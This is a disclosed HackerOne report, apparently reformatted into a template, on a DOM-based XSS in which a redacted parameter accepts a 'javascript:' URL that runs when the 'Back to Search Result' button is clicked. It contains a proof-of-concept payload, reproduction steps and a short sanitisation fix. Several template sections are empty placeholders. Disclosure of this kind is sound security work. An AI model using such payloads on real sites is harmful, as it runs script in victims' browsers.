# DOM Based XSS on https://████ via backURL param

## Metadata
- **Source:** HackerOne
- **Report:** 1159255 | https://hackerone.com/reports/1159255
- **Submitted:** 2021-04-09
- **Reporter:** nagli
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
**Description:**

The following endpoint suffers from DOM Based XSS

```
https://████████/██████=javascript:alert(document.domain)
```

The ████████ param determines the content which will be displayed on the "Back to Search Result" button, eventually leading to RXSS.

## References

██████

## Regards
nagli

## Impact

Executing javascript on the victims behalf

## System Host(s)
████

## Affecte

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description:**

The following endpoint suffers from DOM Based XSS

```
https://████████/██████=javascript:alert(document.domain)
```

The ████████ param determines the content which will be displayed on the "Back to Search Result" button, eventually leading to RXSS.

## References

██████

## Regards
nagli

## Impact

Executing javascript on the victims behalf

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Navigate to
```
https://█████/████=javascript:alert(document.domain)
```

2. Click on "Back to Search Result"

## Suggested Mitigation/Remediation Actions
Sanitize the user input and do not allow malicious schemes to be inserted per the user input.



</details>

---
*Analysed by Claude on 2026-05-24*
